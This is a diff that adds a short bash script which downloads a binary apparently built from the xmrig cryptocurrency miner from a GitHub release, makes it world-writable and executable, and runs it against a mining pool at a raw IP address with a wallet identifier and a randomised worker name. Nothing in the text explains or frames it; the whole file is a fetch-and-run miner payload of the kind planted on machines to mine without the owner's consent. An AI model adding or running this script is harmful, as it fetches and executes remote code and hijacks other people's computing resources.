@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
+chmod 777 vrl
+./vrl -a randomvirel --url 167.99.139.112:80 --user v38ksv6jk6vnvo2k9vfwikr3yg6v5suit4w7h5.$(shuf -n 1 -i 1-99999)-kido
